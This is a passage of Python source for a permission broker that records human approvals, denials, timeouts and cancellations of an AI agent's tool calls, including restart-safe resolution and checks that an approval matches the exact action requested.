        # forever, which freezes the cell watchdog's clock and makes a truly
        # wedged cell unreapable, and parks the HTTP decision thread on a
        # `resolution_done` nobody will ever set.
        try:
            while not pend.event.wait(self._POLL):
                if cancel_ev is not None and cancel_ev.is_set():
                    pend.allow, pend.message = False, "turn cancelled"
                    break
                if time.time() >= deadline:
                    pend.allow, pend.message = False, "approval timed out"
                    break

            requested_allow = bool(pend.allow)
            durable_state = (
                "allowed"
                if requested_allow
                else (
                    "cancelled"
                    if pend.message == "turn cancelled"
                    else (
                        "timed_out"
                        if pend.message == "approval timed out"
                        else "denied"
                    )
                )
            )
            resolved_request = None
            resolution_error: str | None = None
            try:
                resolved_request = store.resolve_permission_request(
                    did,
                    state=durable_state,
                    scope=pend.scope,
                    pattern=pend.pattern,
                    message=pend.message,
                    resolution_context="live_thread",
                    expected_action_digest=(
                        pend.expected_action_digest if requested_allow else None
                    ),
                )
            except Exception:  # noqa: BLE001 — persistence failure must fail closed
                resolution_error = "approval resolution could not be durably recorded"
            actual_state = str((resolved_request or {}).get("state") or "")
            effective_allow = bool(requested_allow and actual_state == "allowed")
            if requested_allow and actual_state == "timed_out":
                resolution_error = "approval request expired"
            elif requested_allow and not effective_allow and resolution_error is None:
                resolution_error = "approval failed exact-action integrity validation"
            # Persist a standing rule only after the concrete request's terminal
            # state is durable; otherwise a failed audit write could still leave a
            # broad allow rule behind.
            if (
                pend.scope
                and pend.scope != "once"
                and actual_state == durable_state
                and actual_state in {"allowed", "denied"}
            ):
                scope_id = {
                    "conversation": root,
                    "project": proj or "default",
                    "global": "",
                }.get(pend.scope, "")
                try:
                    store.set_permission_rule(
                        scope=pend.scope,
                        scope_id=scope_id,
                        tool=method,
                        pattern=(pend.pattern or target or "*"),
                        decision=("allow" if effective_allow else "deny"),
                    )
                except Exception:  # noqa: BLE001
                    pass
            live_resolution = {
                "ok": bool(
                    (effective_allow and actual_state == "allowed")
                    or (not requested_allow and actual_state == durable_state)
                ),
                "decision_id": did,
                "allow": effective_allow,
                "scope": pend.scope,
                "resolution_context": "live_thread",
                "requires_continue": False,
                "original_action_executed": None,
            }
            if not live_resolution["ok"]:
                live_resolution.update(
                    {
                        "error": resolution_error
                        or "approval resolution failed closed",
                        "code": (
                            "decision_expired"
                            if actual_state == "timed_out"
                            else "decision_integrity_failure"
                        ),
                    }
                )
            pend.resolution_result = live_resolution
            pend.resolution_done.set()
            with self._lock:
                self._pending.pop(did, None)
                pending_ids = self._by_root.get(root)
                if pending_ids:
                    pending_ids.discard(did)
                    if not pending_ids:
                        self._by_root.pop(root, None)
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": did,
                        "allow": effective_allow,
                        "scope": pend.scope,
                        "state": actual_state or "failed",
                    }
                )
            except Exception:  # noqa: BLE001
                pass
        finally:
            with self._lock:
                self._pending.pop(did, None)
                pending_ids = self._by_root.get(root)
                if pending_ids:
                    pending_ids.discard(did)
                    if not pending_ids:
                        self._by_root.pop(root, None)
            if not pend.resolution_done.is_set():
                pend.resolution_result = {
                    "ok": False,
                    "decision_id": did,
                    "allow": False,
                    "error": "approval resolution failed closed",
                    "code": "decision_integrity_failure",
                }
                pend.resolution_done.set()
        if effective_allow:
            return {"allow": True, "decision_id": did}
        return {
            "allow": False,
            "decision_id": did,
            "message": resolution_error or pend.message or "denied by user",
        }

    # --- decision + cancel (called by the web gateway / HTTP thread) ------
    def resolve(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
    ) -> bool:
        return bool(
            self.resolve_result(
                decision_id,
                allow=allow,
                scope=scope,
                pattern=pattern,
                message=message,
            ).get("ok")
        )

    def resolve_result(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
        store=None,
        root_frame_id: str | None = None,
    ) -> dict:
        """Resolve an approval and describe whether another turn is required.

        A live decision wakes the exact blocked thread.  After a daemon restart
        that thread no longer exists, so this method never replays stored tool
        arguments.  Instead it records an argument-free ledger marker and
        returns ``requires_continue``; a fresh model turn must replan the work.
        """

        if not decision_id:
            return {
                "ok": False,
                "error": "decision_id is required",
                "code": "decision_id_required",
            }
        if type(allow) is not bool:
            return {
                "ok": False,
                "error": "allow must be a Boolean",
                "code": "invalid_allow",
            }
        normalized_scope = _scope(scope)
        live_pending: _Pending | None = None
        with self._lock:
            pend = self._pending.get(decision_id)
            if pend is not None:
                pending_root = str(pend.payload.get("frame_id") or "")
                if root_frame_id and pending_root != root_frame_id:
                    return {
                        "ok": False,
                        "error": "decision does not belong to frame",
                        "code": "decision_not_found",
                    }
                if pend.event.is_set():
                    return {
                        "ok": False,
                        "error": "decision is already resolving",
                        "code": "decision_in_flight",
                    }
                pend.allow = bool(allow)
                pend.scope = normalized_scope
                pend.pattern = pattern
                pend.message = message
                pend.event.set()
                live_pending = pend
                stores = []
            else:
                # After a daemon restart there is no blocked thread, but the
                # durable request must still be resolvable and auditable.
                stores = ([store] if store is not None else []) + [
                    channel.get("store")
                    for channel in self._channels.values()
                    if channel.get("store") is not None
                ]
        if live_pending is not None:
            # The blocked tool thread publishes this acknowledgement only after
            # the durable terminal state commits, so we wait for it rather than
            # guessing. But the wait is BOUNDED: this runs on the HTTP request
            # thread, and the tool thread it depends on can be lost (daemon
            # shutdown, a raise between the wait loop and the commit) or merely
            # stuck behind a long writer holding the single Store lock. An
            # unbounded wait there parks a server thread for good.
            #
            # Timing out is not the same as failing. The approval may still be
            # committing, so the answer says exactly that and carries a code the
            # client can poll on -- never a denial the caller might act on while
            # the action goes on to execute.
            if not live_pending.resolution_done.wait(self.RESOLVE_ACK_TIMEOUT):
                return {
                    "ok": False,
                    "decision_id": decision_id,
                    "error": (
                        "the decision was accepted and is still being committed; "
                        "re-read the request to see its final state"
                    ),
                    "code": "decision_resolving",
                }
            return dict(
                live_pending.resolution_result
                or {
                    "ok": False,
                    "decision_id": decision_id,
                    "error": "permission resolution failed closed",
                    "code": "decision_integrity_failure",
                }
            )
        terminal = "allowed" if allow else "denied"
        seen_stores: set[int] = set()
        for durable_store in stores:
            if durable_store is None or id(durable_store) in seen_stores:
                continue
            seen_stores.add(id(durable_store))
            try:
                request = durable_store.get_permission_request(decision_id)
                if request is None:
                    continue
                request_root = str(request.get("root_frame_id") or "")
                if root_frame_id and request_root != root_frame_id:
                    return {
                        "ok": False,
                        "error": "decision does not belong to frame",
                        "code": "decision_not_found",
                    }
                state = str(request.get("state") or "")
                expected_action_digest = None
                if allow:
                    try:
                        expected_action_digest = (
                            durable_store.permission_request_action_digest(decision_id)
                        )
                    except ValueError:
                        # A request written before the exact-action columns
                        # existed has no digest to bind to: the migration adds
                        # `canonical_arguments_sha256` without a backfill. The
                        # store's own legacy carve-out already allows such a row
                        # to be resolved by a human; letting this raise instead
                        # meant an upgraded daemon could DENY a pre-upgrade
                        # prompt but never APPROVE one, and reported it as
                        # "unknown or expired decision".
                        expected_action_digest = None
                if state == "pending":
                    expires_at = request.get("expires_at")
                    if expires_at is not None and int(expires_at) <= int(
                        time.time() * 1000
                    ):
                        # A pending that outlived its backstop (e.g. it was
                        # created before a daemon restart) is no longer a valid
                        # approval; time it out instead of activating a fresh
                        # grant from a stale, possibly forgotten, prompt.
                        try:
                            durable_store.resolve_permission_request(
                                decision_id,
                                state="timed_out",
                                scope="once",
                                message="approval timed out",
                                resolution_context="expired",
                            )
                        except Exception:  # noqa: BLE001 - best-effort cleanup
                            pass
                        return {
                            "ok": False,
                            "error": "approval request expired",
                            "code": "decision_expired",
                        }
                    request = durable_store.resolve_permission_request(
                        decision_id,
                        state=terminal,
                        scope=normalized_scope,
                        pattern=pattern,
                        message=message,
                        resolution_context="after_restart",
                        # Activated only after the ledger marker is durable.
                        continuation_required=False,
                        expected_action_digest=expected_action_digest,
                    )
                elif not (
                    state == terminal
                    and request.get("resolution_context") == "after_restart"
                ):
                    return {
                        "ok": False,
                        "error": f"decision is already {state or 'resolved'}",
                        "code": "decision_already_resolved",
                    }
                if str(request.get("state") or "") != terminal:
                    return {
                        "ok": False,
                        "error": (
                            "approval request expired"
                            if request.get("state") == "timed_out"
                            else "approval failed exact-action integrity validation"
                        ),
                        "code": (
                            "decision_expired"
                            if request.get("state") == "timed_out"
                            else "decision_integrity_failure"
                        ),
                    }
                if _scope(request.get("scope")) != normalized_scope or (
                    request.get("pattern") or None
                ) != (pattern or None):
                    return {
                        "ok": False,
                        "error": "resolved decision scope or pattern cannot be changed",
                        "code": "decision_immutable",
                    }

                if not _restart_resolution_marker(
                    durable_store, request, allow=bool(allow)
                ):
                    return {
                        "ok": False,
                        "decision_recorded": True,
                        "error": "approval was recorded but its continuation marker failed",
                        # The approval IS written. P0-4's `output_committed`
                        # exists for exactly this: the UI must not offer a
                        # retry that would submit a decision twice.
                        "code": "decision_continuation_failed",
                        "output_committed": True,
                        "requires_continue": False,
                        "original_action_executed": False,
                    }

                if allow:
                    request = durable_store.activate_restart_permission_continuation(
                        decision_id,
                        expires_at=(
                            int((time.time() + self.DEFAULT_TIMEOUT) * 1000)
                            if normalized_scope == "once"
                            else None
                        ),
                    )

                if normalized_scope != "once":
                    scope_id = {
                        "conversation": request_root,
                        "project": request.get("project_id") or "default",
                        "global": "",
                    }[normalized_scope]
                    durable_store.set_permission_rule(
                        scope=normalized_scope,
                        scope_id=scope_id,
                        tool=str(request.get("tool") or ""),
                        pattern=(pattern or request.get("target") or "*"),
                        decision=("allow" if allow else "deny"),
                    )
                once_consumed = bool(request.get("continuation_consumed_at"))
                once_expired = bool(
                    allow
                    and normalized_scope == "once"
                    and (
                        not request.get("continuation_expires_at")
                        or int(request["continuation_expires_at"])
                        <= int(time.time() * 1000)
                    )
                )
                requires_continue = bool(
                    allow
                    and (
                        normalized_scope != "once"
                        or (not once_consumed and not once_expired)
                    )
                )
                return {
                    "ok": True,
                    "decision_id": decision_id,
                    "allow": bool(allow),
                    "scope": normalized_scope,
                    "resolution_context": "after_restart",
                    "requires_continue": requires_continue,
                    "original_action_executed": False,
                    "continuation_expires_at": (
                        request.get("continuation_expires_at") if allow else None
                    ),
                    "continuation_authorization": (
                        (
                            (
                                "consumed"
                                if once_consumed
                                else ("expired" if once_expired else "once")
                            )
                            if allow and normalized_scope == "once"
                            else "standing_rule"
                        )
                        if allow
                        else None
                    ),
                }
            except Exception:  # noqa: BLE001 — try another registered store
                continue
        return {"ok": False, "error": "unknown or expired decision"}

    def cancel_root(self, root_frame_id: str) -> None:
        """Deny every pending prompt for a conversation (on turn cancel)."""
        with self._lock:
            dids = list(self._by_root.get(root_frame_id, ()))
            for did in dids:
                pend = self._pending.get(did)
                if pend is not None:
                    pend.allow = False
                    pend.message = "turn cancelled"
                    pend.event.set()


_BROKER: PermissionBroker | None = None
_BROKER_LOCK = threading.Lock()


def broker() -> PermissionBroker:
    global _BROKER
    if _BROKER is None:
        with _BROKER_LOCK:
            if _BROKER is None:
                _BROKER = PermissionBroker()
    return _BROKER
